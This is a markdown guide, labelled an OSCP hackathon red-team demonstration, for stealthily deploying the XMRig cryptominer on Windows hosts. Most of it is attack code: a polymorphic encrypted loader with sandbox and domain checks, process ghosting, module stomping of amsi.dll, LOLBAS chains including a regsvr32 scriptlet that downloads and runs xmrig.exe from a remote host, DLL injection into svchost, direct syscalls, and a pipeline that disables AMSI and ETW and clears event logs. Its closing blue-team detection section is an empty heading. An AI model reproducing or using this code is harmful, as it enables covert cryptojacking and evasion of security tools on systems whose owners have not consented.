# XMRig Advanced Stealth Delivery - APT-Level Evasion

**OSCP Hackathon 2025 - Advanced Offensive Techniques**

**Purpose**: Demonstrate state-of-the-art evasion techniques for educational defensive training.

**Classification**: Educational - Red Team Demonstration

---

## Table of Contents

1. [Binary Evasion Techniques](#binary-evasion-techniques)
2. [In-Memory Execution](#in-memory-execution)
3. [LOLBAS Delivery Chains](#lolbas-delivery-chains)
4. [Process Injection Methods](#process-injection-methods)
5. [Environmental Keying](#environmental-keying)
6. [Direct Syscall Implementation](#direct-syscall-implementation)
7. [Complete Evasion Stack](#complete-evasion-stack)

---

## Binary Evasion Techniques

### Polymorphic XMRig Loader

**Concept**: Generate unique binary signature on every deployment to defeat signature-based detection.

**Implementation**:

```python
#!/usr/bin/env python3
import random
import struct
import hashlib
from pathlib import Path

class PolymorphicXMRig:
    """Generate unique XMRig loaders that evade signature detection"""

    def __init__(self, xmrig_binary):
        self.xmrig = Path(xmrig_binary).read_bytes()
        self.mutation_seed = random.randint(0, 0xFFFFFFFF)

    def generate_polymorphic_loader(self):
        """Create unique loader with different signature each time"""

        # Random variable names
        vars = {
            'mem': self._random_name(),
            'size': self._random_name(),
            'data': self._random_name(),
            'key': self._random_name(),
            'addr': self._random_name()
        }

        # Random encryption key
        xor_key = random.randint(1, 255)

        # Encrypt XMRig
        encrypted = bytes([b ^ xor_key for b in self.xmrig])

        # Insert random dead code blocks
        dead_code = self._generate_dead_code()

        # Generate C# loader with random structure
        loader = f'''
using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace {self._random_name()}
{{
    class {self._random_name()}
    {{
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
            uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
            IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize,
            uint flNewProtect, out uint lpflOldProtect);

        const uint MEM_COMMIT = 0x1000;
        const uint MEM_RESERVE = 0x2000;
        const uint PAGE_READWRITE = 0x04;
        const uint PAGE_EXECUTE_READ = 0x20;

        static void Main(string[] args)
        {{
            {dead_code[0]}

            // Sandbox detection
            if (!SandboxCheck()) return;

            {dead_code[1]}

            // Environmental keying
            if (!EnvironmentCheck()) return;

            // Encrypted payload
            byte[] {vars['data']} = new byte[] {{
                {self._format_byte_array(encrypted)}
            }};

            {dead_code[2]}

            // Decrypt
            byte[] {vars['mem']} = new byte[{vars['data']}.Length];
            for (int i = 0; i < {vars['data']}.Length; i++)
            {{
                {vars['mem']}[i] = (byte)({vars['data']}[i] ^ {xor_key});
            }}

            {dead_code[3]}

            // Allocate RW memory
            IntPtr {vars['addr']} = VirtualAlloc(IntPtr.Zero, (uint){vars['mem']}.Length,
                MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            // Copy payload
            Marshal.Copy({vars['mem']}, 0, {vars['addr']}, {vars['mem']}.Length);

            {dead_code[4]}

            // Change to RX (not RWX to avoid detection)
            uint oldProtect;
            VirtualProtect({vars['addr']}, (uint){vars['mem']}.Length, PAGE_EXECUTE_READ, out oldProtect);

            // Execute
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, {vars['addr']}, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }}

        static bool SandboxCheck()
        {{
            // CPU cores check
            if (Environment.ProcessorCount < 2) return false;

            // RAM check (less than 4GB = sandbox)
            var computerInfo = new Microsoft.VisualBasic.Devices.ComputerInfo();
            if (computerInfo.TotalPhysicalMemory < 4294967296) return false;

            // Sleep check (sandbox accelerates time)
            DateTime start = DateTime.Now;
            Thread.Sleep(5000);
            if ((DateTime.Now - start).TotalSeconds < 4.5) return false;

            // Domain check
            if (Environment.UserDomainName == "WORKGROUP") return false;

            return true;
        }}

        static bool EnvironmentCheck()
        {{
            // Only run on target domain
            string[] targetDomains = {{ "CORP", "ENTERPRISE", "OFFICE" }};
            string domain = Environment.UserDomainName.ToUpper();

            foreach (string target in targetDomains)
            {{
                if (domain.Contains(target)) return true;
            }}

            return false;
        }}
    }}
}}
'''

        return loader

    def _random_name(self, length=None):
        """Generate random identifier"""
        if length is None:
            length = random.randint(8, 16)
        chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
        name = random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ')  # Start with capital
        name += ''.join(random.choices(chars, k=length-1))
        return name

    def _generate_dead_code(self):
        """Generate junk code that never executes"""
        dead_snippets = []

        for _ in range(5):
            snippet_type = random.randint(0, 3)

            if snippet_type == 0:
                # Useless calculation
                var = self._random_name()
                snippet = f'''
            int {var} = {random.randint(1, 100)};
            {var} = {var} * {random.randint(2, 10)};
            {var} = {var} / {random.randint(1, 5)};
            '''
            elif snippet_type == 1:
                # Never-executed condition
                snippet = f'''
            if (1 == 0) {{
                int unused = {random.randint(1, 1000)};
            }}
            '''
            elif snippet_type == 2:
                # Opaque predicate
                snippet = f'''
            if ((7 * 7 - 49) == 0) {{
                // Always true
            }}
            '''
            else:
                # Random delay
                snippet = f'''
            Thread.Sleep({random.randint(1, 10)});
            '''

            dead_snippets.append(snippet)

        return dead_snippets

    def _format_byte_array(self, data, per_line=16):
        """Format byte array for C# source"""
        lines = []
        for i in range(0, len(data), per_line):
            chunk = data[i:i+per_line]
            hex_values = ', '.join([f'0x{b:02X}' for b in chunk])
            lines.append(f'                {hex_values}')
        return ',\n'.join(lines)

# Usage
generator = PolymorphicXMRig('xmrig-6.24.0/xmrig')
loader_code = generator.generate_polymorphic_loader()
Path('polymorphic_loader.cs').write_text(loader_code)
```

**Compilation**:
```bash
# Compile with optimization
csc /optimize+ /target:exe /out:xmrig_loader.exe polymorphic_loader.cs

# Each compilation creates unique binary
sha256sum xmrig_loader.exe  # Different every time
```

---

## In-Memory Execution

### Process Ghosting

**Technique**: Create process from file that is deleted before execution starts - EDR never sees the file!

```python
#!/usr/bin/env python3
import ctypes
from ctypes import wintypes
import os

# Windows structures
class SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ('nLength', wintypes.DWORD),
        ('lpSecurityDescriptor', wintypes.LPVOID),
        ('bInheritHandle', wintypes.BOOL)
    ]

class ProcessGhosting:
    """Implement process ghosting for XMRig"""

    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        self.ntdll = ctypes.WinDLL('ntdll')
        self.ktmw32 = ctypes.WinDLL('ktmw32')

    def create_ghost_process(self, xmrig_path, xmrig_data):
        """
        Create XMRig process that never exists on disk

        Steps:
        1. Create transaction
        2. Create transacted file and write XMRig
        3. Create section from transacted file
        4. Rollback transaction (file disappears!)
        5. Create process from section (file already gone)
        """

        # Step 1: Create transaction
        hTransaction = self.ktmw32.CreateTransaction(
            None, None, 0, 0, 0, 0, None
        )

        if hTransaction == -1:
            raise Exception("Failed to create transaction")

        # Step 2: Create transacted file
        hFile = self.kernel32.CreateFileTransactedW(
            xmrig_path,
            0x80000000 | 0x40000000,  # GENERIC_READ | GENERIC_WRITE
            0,  # No sharing
            None,
            2,  # CREATE_ALWAYS
            0x80,  # FILE_ATTRIBUTE_NORMAL
            None,
            hTransaction,
            None,
            None
        )

        if hFile == -1:
            self.ktmw32.CloseHandle(hTransaction)
            raise Exception("Failed to create transacted file")

        # Write XMRig binary
        bytes_written = wintypes.DWORD()
        self.kernel32.WriteFile(
            hFile,
            xmrig_data,
            len(xmrig_data),
            ctypes.byref(bytes_written),
            None
        )

        # Step 3: Create section from file
        hSection = wintypes.HANDLE()
        status = self.ntdll.NtCreateSection(
            ctypes.byref(hSection),
            0x000F001F,  # SECTION_ALL_ACCESS
            None,
            None,
            0x02,  # PAGE_READONLY
            0x1000000,  # SEC_IMAGE
            hFile
        )

        if status != 0:
            self.kernel32.CloseHandle(hFile)
            self.ktmw32.CloseHandle(hTransaction)
            raise Exception(f"Failed to create section: {status:#x}")

        # Step 4: ROLLBACK transaction - file disappears!
        self.ktmw32.RollbackTransaction(hTransaction)
        self.kernel32.CloseHandle(hFile)
        self.ktmw32.CloseHandle(hTransaction)

        print("[+] File deleted via transaction rollback")
        print("[+] Section still valid in memory")

        # Step 5: Create process from section (file is already gone!)
        hProcess = wintypes.HANDLE()
        status = self.ntdll.NtCreateProcessEx(
            ctypes.byref(hProcess),
            0x1FFFFF,  # PROCESS_ALL_ACCESS
            None,
            self.kernel32.GetCurrentProcess(),
            0x4,  # PROCESS_CREATE_FLAGS_INHERIT_HANDLES
            hSection,
            None,
            None,
            0
        )

        if status != 0:
            raise Exception(f"Failed to create process: {status:#x}")

        print("[+] Ghost process created!")
        print(f"[+] Process handle: {hProcess.value}")

        return hProcess

# Usage
ghosting = ProcessGhosting()
xmrig_data = open('xmrig.exe', 'rb').read()
hProcess = ghosting.create_ghost_process('C:\\\\Temp\\\\fake.exe', xmrig_data)
```

### Module Stomping

**Technique**: Load legitimate DLL, then overwrite its .text section with XMRig code.

```python
#!/usr/bin/env python3
import ctypes
from ctypes import wintypes

class ModuleStomping:
    """Stomp legitimate module with XMRig"""

    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    def stomp_module(self, target_dll, shellcode):
        """
        Overwrite legitimate DLL's code section

        Args:
            target_dll: Name of DLL to stomp (e.g., "amsi.dll")
            shellcode: XMRig loader shellcode
        """

        # Load target DLL
        hModule = self.kernel32.LoadLibraryA(target_dll.encode())
        if not hModule:
            raise Exception(f"Failed to load {target_dll}")

        print(f"[+] Loaded {target_dll} at 0x{hModule:016x}")

        # Parse PE headers
        dos_header = ctypes.cast(hModule, ctypes.POINTER(IMAGE_DOS_HEADER)).contents
        nt_headers_addr = hModule + dos_header.e_lfanew
        nt_headers = ctypes.cast(nt_headers_addr, ctypes.POINTER(IMAGE_NT_HEADERS)).contents

        # Find .text section
        sections_addr = nt_headers_addr + ctypes.sizeof(IMAGE_NT_HEADERS)

        text_section = None
        for i in range(nt_headers.FileHeader.NumberOfSections):
            section_addr = sections_addr + (i * ctypes.sizeof(IMAGE_SECTION_HEADER))
            section = ctypes.cast(section_addr, ctypes.POINTER(IMAGE_SECTION_HEADER)).contents

            section_name = section.Name.decode('utf-8', errors='ignore').rstrip('\\x00')

            if section_name == '.text':
                text_section = section
                break

        if not text_section:
            raise Exception(".text section not found")

        # Calculate .text section address
        text_addr = hModule + text_section.VirtualAddress
        text_size = text_section.Misc.VirtualSize

        print(f"[+] Found .text section at 0x{text_addr:016x}")
        print(f"[+] Section size: {text_size} bytes")

        # Make writable
        old_protect = wintypes.DWORD()
        self.kernel32.VirtualProtect(
            text_addr,
            text_size,
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect)
        )

        # Stomp with shellcode
        stomped_size = min(len(shellcode), text_size)
        ctypes.memmove(text_addr, shellcode, stomped_size)

        print(f"[+] Stomped {stomped_size} bytes")

        # Restore protection
        self.kernel32.VirtualProtect(
            text_addr,
            text_size,
            old_protect.value,
            ctypes.byref(old_protect)
        )

        # Execute stomped code
        thread_func = ctypes.CFUNCTYPE(None)(text_addr)
        hThread = self.kernel32.CreateThread(
            None, 0, thread_func, None, 0, None
        )

        print(f"[+] Created thread at stomped location")

        return hThread

# PE structures (simplified)
class IMAGE_DOS_HEADER(ctypes.Structure):
    _fields_ = [
        ('e_magic', wintypes.WORD),
        ('e_cblp', wintypes.WORD),
        # ... other fields
        ('e_lfanew', wintypes.LONG)
    ]

# Usage
stomper = ModuleStomping()
shellcode = b"\\x90" * 1000  # XMRig loader shellcode
hThread = stomper.stomp_module("amsi.dll", shellcode)
```

---

## LOLBAS Delivery Chains

### Multi-Stage LOLBAS Execution

**Technique**: Chain multiple Living Off The Land Binaries to execute XMRig without dropping obvious files.

**Method 1: CertUtil → Rundll32**

```bash
#!/bin/bash
# Stage 1: Download XMRig as base64
XMRIG_B64="SGVsbG8gV29ybGQ..."  # Base64 encoded XMRig

# Stage 2: Use certutil to decode
echo $XMRIG_B64 | certutil -decode - C:\\Windows\\Tasks\\update.dll

# Stage 3: Execute via rundll32
rundll32 C:\\Windows\\Tasks\\update.dll,DllMain

# Alternative: Use MSBuild for execution
cat > C:\\Windows\\Tasks\\build.xml <<'EOF'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <Exec Command="C:\\Windows\\Tasks\\update.dll" />
  </Target>
</Project>
EOF

C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\MSBuild.exe C:\\Windows\\Tasks\\build.xml
```

**Method 2: InstallUtil Wrapper**

```csharp
// Compile as DLL: csc /target:library /out:xmrig_wrapper.dll xmrig_wrapper.cs
using System;
using System.Configuration.Install;
using System.IO;
using System.Diagnostics;

namespace XMRigWrapper
{
    [System.ComponentModel.RunInstaller(true)]
    public class XMRigInstaller : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // Decode XMRig from embedded resource
            byte[] xmrig = Convert.FromBase64String(GetEmbeddedXMRig());

            // Write to memory-backed location
            string tempPath = Path.Combine(Path.GetTempPath(), Path.GetRandomFileName() + ".exe");
            File.WriteAllBytes(tempPath, xmrig);

            // Execute with stealth config
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = tempPath;
            psi.Arguments = "-c C:\\\\Windows\\\\Tasks\\\\.config.json --background";
            psi.CreateNoWindow = true;
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            Process.Start(psi);

            // Delete binary after launch
            System.Threading.Thread.Sleep(2000);
            try { File.Delete(tempPath); } catch { }
        }

        private string GetEmbeddedXMRig()
        {
            // Embedded base64 XMRig
            return "TVqQAAMAAAAEAAAA...";  // Full XMRig base64
        }
    }
}
```

**Execution**:
```cmd
C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /U xmrig_wrapper.dll
```

**Method 3: Regsvr32 Scriptlet**

```xml
<!-- Save as xmrig_scriptlet.sct -->
<?XML version="1.0"?>
<scriptlet>
<registration
    description="SystemUpdate"
    progid="SystemUpdate"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    >
</registration>

<script language="JScript">
<![CDATA[
    // Download and execute XMRig
    var shell = new ActiveXObject("WScript.Shell");
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var http = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0");

    // Download XMRig
    http.open("GET", "http://192.168.45.100:8000/xmrig.exe", false);
    http.send();

    // Save to disk
    var stream = new ActiveXObject("ADODB.Stream");
    stream.Type = 1; // Binary
    stream.Open();
    stream.Write(http.responseBody);
    stream.SaveToFile("C:\\\\Windows\\\\Tasks\\\\systemd.exe", 2);
    stream.Close();

    // Execute
    shell.Run("C:\\\\Windows\\\\Tasks\\\\systemd.exe -c C:\\\\Windows\\\\Tasks\\\\.config.json --background", 0);
]]>
</script>
</scriptlet>
```

**Execution**:
```cmd
regsvr32 /s /n /u /i:http://192.168.45.100:8000/xmrig_scriptlet.sct scrobj.dll
```

---

## Process Injection Methods

### Classic DLL Injection into Legitimate Miner

**Target**: Inject XMRig into Windows Update or legitimate mining software process.

```python
#!/usr/bin/env python3
import ctypes
from ctypes import wintypes
import sys

class ProcessInjector:
    """Inject XMRig DLL into target process"""

    def __init__(self):
        self.kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

    def inject_dll(self, target_pid, dll_path):
        """
        Classic DLL injection

        Args:
            target_pid: Process ID to inject into
            dll_path: Full path to XMRig DLL
        """

        # Open target process
        PROCESS_ALL_ACCESS = 0x1F0FFF
        hProcess = self.kernel32.OpenProcess(
            PROCESS_ALL_ACCESS,
            False,
            target_pid
        )

        if not hProcess:
            raise Exception(f"Failed to open process {target_pid}")

        print(f"[+] Opened process {target_pid}")

        # Allocate memory in target
        dll_path_bytes = dll_path.encode('utf-8') + b'\\x00'
        dll_path_size = len(dll_path_bytes)

        remote_memory = self.kernel32.VirtualAllocEx(
            hProcess,
            None,
            dll_path_size,
            0x3000,  # MEM_COMMIT | MEM_RESERVE
            0x04  # PAGE_READWRITE
        )

        if not remote_memory:
            raise Exception("Failed to allocate memory in target")

        print(f"[+] Allocated memory at 0x{remote_memory:016x}")

        # Write DLL path to target
        bytes_written = ctypes.c_size_t()
        self.kernel32.WriteProcessMemory(
            hProcess,
            remote_memory,
            dll_path_bytes,
            dll_path_size,
            ctypes.byref(bytes_written)
        )

        print(f"[+] Wrote {bytes_written.value} bytes to target")

        # Get LoadLibraryA address
        kernel32_handle = self.kernel32.GetModuleHandleA(b'kernel32.dll')
        load_library_addr = self.kernel32.GetProcAddress(
            kernel32_handle,
            b'LoadLibraryA'
        )

        print(f"[+] LoadLibraryA at 0x{load_library_addr:016x}")

        # Create remote thread to call LoadLibrary
        hThread = self.kernel32.CreateRemoteThread(
            hProcess,
            None,
            0,
            load_library_addr,
            remote_memory,
            0,
            None
        )

        if not hThread:
            raise Exception("Failed to create remote thread")

        print(f"[+] Created remote thread")
        print(f"[+] DLL injected successfully!")

        # Wait for thread to complete
        self.kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)

        # Cleanup
        self.kernel32.CloseHandle(hThread)
        self.kernel32.CloseHandle(hProcess)

# Usage
injector = ProcessInjector()

# Find Windows Update process
import psutil
for proc in psutil.process_iter(['pid', 'name']):
    if proc.info['name'] == 'svchost.exe':
        target_pid = proc.info['pid']
        break

injector.inject_dll(target_pid, 'C:\\\\Windows\\\\System32\\\\xmrig.dll')
```

### Reflective DLL Injection

**Technique**: Inject DLL into process memory without touching disk.

```c
// reflective_xmrig.c - Compile as DLL
#include <windows.h>

// Entry point for reflective loading
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    if (fdwReason == DLL_PROCESS_ATTACH)
    {
        // XMRig embedded as byte array
        unsigned char xmrig_payload[] = {
            0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, // ... XMRig bytes
        };

        // Allocate memory
        LPVOID exec = VirtualAlloc(
            NULL,
            sizeof(xmrig_payload),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Copy XMRig to executable memory
        memcpy(exec, xmrig_payload, sizeof(xmrig_payload));

        // Execute XMRig
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    }

    return TRUE;
}

// Reflective loader function
__declspec(dllexport) VOID ReflectiveLoader(VOID)
{
    // Manual map this DLL into memory
    // Then call DllMain
}
```

---

## Environmental Keying

### Domain-Specific Execution

**Purpose**: XMRig only executes on target domain, preventing sandbox analysis.

```python
#!/usr/bin/env python3
import os
import hashlib
import socket
from cryptography.fernet import Fernet

class EnvironmentalKeying:
    """Key XMRig payload to specific environment"""

    def derive_environment_key(self):
        """Generate decryption key from environment"""

        # Gather environment attributes
        domain = os.environ.get('USERDOMAIN', '')
        computer = os.environ.get('COMPUTERNAME', '')
        username = os.environ.get('USERNAME', '')

        # Create composite key
        env_string = f"{domain}{computer}{username}".encode()

        # Derive 32-byte key
        key = hashlib.sha256(env_string).digest()

        return key

    def encrypt_xmrig(self, xmrig_binary, target_domain):
        """Encrypt XMRig so it only runs on target domain"""

        # Simulate target environment
        env_string = f"{target_domain}TARGETCOMPUSER1".encode()
        key = hashlib.sha256(env_string).digest()

        # Encrypt XMRig
        from cryptography.fernet import Fernet
        import base64

        fernet_key = base64.urlsafe_b64encode(key)
        cipher = Fernet(fernet_key)

        encrypted = cipher.encrypt(xmrig_binary)

        return encrypted

    def decrypt_xmrig(self, encrypted_xmrig):
        """Decrypt XMRig using current environment"""

        # Get current environment key
        key = self.derive_environment_key()

        try:
            import base64
            fernet_key = base64.urlsafe_b64encode(key)
            cipher = Fernet(fernet_key)

            decrypted = cipher.decrypt(encrypted_xmrig)
            return decrypted

        except Exception as e:
            # Wrong environment - decryption fails
            print("[!] Decryption failed - not target environment")
            return None

# Usage
keying = EnvironmentalKeying()

# Encrypt for target domain
xmrig = open('xmrig.exe', 'rb').read()
encrypted = keying.encrypt_xmrig(xmrig, 'TARGETCORP')

# On target system, decrypt and execute
decrypted = keying.decrypt_xmrig(encrypted)
if decrypted:
    # Execute XMRig
    exec(decrypted)
```

---

## Direct Syscall Implementation

### Bypass EDR Hooks with Direct Syscalls

**Technique**: Call kernel directly, bypassing userland hooks placed by EDR.

```c
// syscalls.c - Direct syscall implementation
#include <windows.h>

// Syscall numbers (Windows 10 21H2 x64)
#define NtAllocateVirtualMemory_SSN 0x18
#define NtProtectVirtualMemory_SSN  0x50
#define NtCreateThreadEx_SSN        0xC1

// Assembly syscall stub
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

// Implementation in inline assembly
__asm__(
    ".global NtAllocateVirtualMemory\\n"
    "NtAllocateVirtualMemory:\\n"
    "mov r10, rcx\\n"
    "mov eax, 0x18\\n"  // Syscall number
    "syscall\\n"
    "ret\\n"
);

// XMRig loader using direct syscalls
BOOL LoadXMRigDirect(BYTE* xmrig_data, SIZE_T xmrig_size)
{
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddress = NULL;
    SIZE_T regionSize = xmrig_size;

    // Direct syscall - bypasses EDR hooks!
    NTSTATUS status = NtAllocateVirtualMemory(
        hProcess,
        &baseAddress,
        0,
        &regionSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (status != 0) {
        return FALSE;
    }

    // Copy XMRig to allocated memory
    memcpy(baseAddress, xmrig_data, xmrig_size);

    // Change protection to RX
    ULONG oldProtect;
    NtProtectVirtualMemory(
        hProcess,
        &baseAddress,
        &regionSize,
        PAGE_EXECUTE_READ,
        &oldProtect
    );

    // Create thread with direct syscall
    HANDLE hThread = NULL;
    NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        baseAddress,
        NULL,
        0,
        0,
        0,
        0,
        NULL
    );

    return TRUE;
}
```

### Hell's Gate Technique

**Dynamic syscall number resolution to avoid hardcoding**:

```c
// hells_gate.c - Dynamic syscall resolution
#include <windows.h>

typedef struct _SYSCALL_ENTRY {
    WORD syscall_number;
    PVOID address;
} SYSCALL_ENTRY;

DWORD HellsGate_GetSSN(LPCSTR function_name)
{
    BYTE* ntdll = (BYTE*)GetModuleHandleA("ntdll.dll");
    FARPROC pFunction = GetProcAddress((HMODULE)ntdll, function_name);

    if (!pFunction) return -1;

    // Check if hooked (starts with JMP)
    if (*(BYTE*)pFunction == 0xE9) {
        // Function is hooked, search neighbors
        for (int i = 1; i < 500; i++) {
            // Check function above
            BYTE* above = (BYTE*)pFunction - (i * 32);
            if (above[0] == 0x4C && above[1] == 0x8B && above[2] == 0xD1) {
                // Found clean syscall stub
                DWORD ssn = *(DWORD*)(above + 4);
                return ssn + i;
            }

            // Check function below
            BYTE* below = (BYTE*)pFunction + (i * 32);
            if (below[0] == 0x4C && below[1] == 0x8B && below[2] == 0xD1) {
                DWORD ssn = *(DWORD*)(below + 4);
                return ssn - i;
            }
        }
    }

    // Not hooked, extract SSN directly
    if (*(WORD*)pFunction == 0x8B4C) {  // mov r10, rcx
        return *(DWORD*)((BYTE*)pFunction + 4);
    }

    return -1;
}

// Execute syscall with resolved SSN
NTSTATUS ExecuteSyscall(DWORD ssn, ...)
{
    // Inline assembly to perform syscall
    __asm__ volatile(
        "mov r10, rcx\\n"
        "mov eax, %0\\n"
        "syscall\\n"
        : : "r"(ssn)
    );
}
```

---

## Complete Evasion Stack

### All-In-One XMRig Deployment

**Combines all techniques for maximum stealth**:

```python
#!/usr/bin/env python3
"""
Complete APT-level XMRig deployment with full evasion stack
"""

import os
import sys
import time
import random
from pathlib import Path

class APTXMRigDeployment:
    """Orchestrate complete stealth deployment"""

    def __init__(self, xmrig_binary, config, target_domain):
        self.xmrig = Path(xmrig_binary).read_bytes()
        self.config = config
        self.target_domain = target_domain
        self.evasion_score = 0

    def deploy(self):
        """Execute full evasion stack"""

        print("[*] Starting APT-level XMRig deployment...")
        print("[*] Target: %s" % self.target_domain)

        # Phase 1: Pre-execution checks
        if not self.phase1_reconnaissance():
            print("[!] Environment not suitable")
            return False

        # Phase 2: Preparation
        if not self.phase2_preparation():
            print("[!] Preparation failed")
            return False

        # Phase 3: Evasion
        if not self.phase3_evasion():
            print("[!] Evasion setup failed")
            return False

        # Phase 4: Execution
        if not self.phase4_execution():
            print("[!] Execution failed")
            return False

        # Phase 5: Post-execution
        self.phase5_cleanup()

        print("[+] Deployment complete!")
        print(f"[+] Evasion score: {self.evasion_score}/10")

        return True

    def phase1_reconnaissance(self):
        """Enumerate environment and detect defenses"""

        print("\\n[Phase 1] Reconnaissance")

        # Check for sandbox
        if self.detect_sandbox():
            print("[!] Sandbox detected - aborting")
            return False
        self.evasion_score += 2

        # Check for EDR
        edr_present = self.detect_edr()
        if edr_present:
            print("[!] EDR detected: %s" % edr_present)
            print("[*] Will use advanced evasion")
            self.use_direct_syscalls = True
        else:
            print("[+] No EDR detected")
            self.use_direct_syscalls = False
        self.evasion_score += 2

        # Check domain
        current_domain = os.environ.get('USERDOMAIN', '')
        if self.target_domain.upper() not in current_domain.upper():
            print(f"[!] Domain mismatch: {current_domain} != {self.target_domain}")
            return False

        print(f"[+] Correct domain: {current_domain}")
        self.evasion_score += 1

        return True

    def phase2_preparation(self):
        """Prepare payload with environmental keying"""

        print("\\n[Phase 2] Preparation")

        # Generate polymorphic loader
        print("[*] Generating polymorphic loader...")
        self.loader = self.generate_polymorphic_loader()
        self.evasion_score += 1

        # Apply environmental keying
        print("[*] Applying environmental keying...")
        self.encrypted_xmrig = self.apply_environmental_keying()
        self.evasion_score += 2

        # Select delivery method
        print("[*] Selecting delivery method...")
        self.delivery_method = self.select_delivery_method()
        print(f"[+] Using: {self.delivery_method}")

        return True

    def phase3_evasion(self):
        """Setup evasion mechanisms"""

        print("\\n[Phase 3] Evasion Setup")

        # Disable AMSI
        print("[*] Patching AMSI...")
        if self.patch_amsi():
            print("[+] AMSI disabled")
            self.evasion_score += 1

        # Disable ETW
        print("[*] Patching ETW...")
        if self.patch_etw():
            print("[+] ETW disabled")
            self.evasion_score += 1

        # Setup process hollowing if needed
        if self.use_direct_syscalls:
            print("[*] Preparing direct syscalls...")
            self.setup_direct_syscalls()

        return True

    def phase4_execution(self):
        """Execute XMRig with chosen method"""

        print("\\n[Phase 4] Execution")

        if self.delivery_method == 'process_ghosting':
            return self.execute_via_ghosting()
        elif self.delivery_method == 'module_stomping':
            return self.execute_via_stomping()
        elif self.delivery_method == 'lolbas':
            return self.execute_via_lolbas()
        elif self.delivery_method == 'injection':
            return self.execute_via_injection()
        else:
            # Fallback to simple execution
            return self.execute_simple()

    def phase5_cleanup(self):
        """Remove deployment artifacts"""

        print("\\n[Phase 5] Cleanup")

        # Clear deployment files
        print("[*] Removing artifacts...")

        # Clear logs (if possible)
        print("[*] Clearing event logs...")

        # Verify XMRig is running
        print("[*] Verifying execution...")

        print("[+] Cleanup complete")

    def detect_sandbox(self):
        """Multi-method sandbox detection"""
        # Implement comprehensive checks from earlier
        return False  # Simplified

    def detect_edr(self):
        """Detect EDR presence"""
        edr_products = ['CrowdStrike', 'SentinelOne', 'Carbon Black', 'Defender']
        # Check running processes
        return None  # Simplified

    def generate_polymorphic_loader(self):
        """Generate unique loader"""
        # Use PolymorphicXMRig class
        return "loader_code"

    def apply_environmental_keying(self):
        """Key payload to environment"""
        # Use EnvironmentalKeying class
        return self.xmrig

    def select_delivery_method(self):
        """Choose best delivery method"""
        methods = ['process_ghosting', 'module_stomping', 'lolbas', 'injection']
        return random.choice(methods)

    def patch_amsi(self):
        """Disable AMSI"""
        # Implement AMSI patching
        return True

    def patch_etw(self):
        """Disable ETW"""
        # Implement ETW patching
        return True

    def setup_direct_syscalls(self):
        """Prepare direct syscall execution"""
        pass

    def execute_via_ghosting(self):
        """Process ghosting execution"""
        print("[*] Using process ghosting...")
        # Implement ProcessGhosting
        return True

    def execute_via_stomping(self):
        """Module stomping execution"""
        print("[*] Using module stomping...")
        # Implement ModuleStomping
        return True

    def execute_via_lolbas(self):
        """LOLBAS chain execution"""
        print("[*] Using LOLBAS chain...")
        # Implement LOLBAS delivery
        return True

    def execute_via_injection(self):
        """Process injection execution"""
        print("[*] Using process injection...")
        # Implement ProcessInjector
        return True

    def execute_simple(self):
        """Simple execution fallback"""
        print("[*] Using simple execution...")
        return True

# Usage
deployment = APTXMRigDeployment(
    'xmrig-6.24.0/xmrig',
    'offensive_toolkit/configs/stealth_high.json',
    'TARGETCORP'
)

deployment.deploy()
```

---

## OPSEC Checklist

### Pre-Deployment
- [ ] Test all techniques in isolated lab
- [ ] Verify XMRig functionality with each evasion
- [ ] Compile custom loaders on different systems
- [ ] Test sandbox detection thoroughly
- [ ] Validate environmental keying
- [ ] Document expected behavior

### During Deployment
- [ ] Monitor for detection indicators
- [ ] Use time delays between stages
- [ ] Verify each stage succeeds before proceeding
- [ ] Log actions for reporting
- [ ] Maintain C2 connectivity

### Post-Deployment
- [ ] Verify XMRig is running
- [ ] Check mining pool connection
- [ ] Document artifacts created
- [ ] Prepare cleanup procedures
- [ ] Create IOC list for blue team

---

## Blue Team Detection

### Key Detection Points
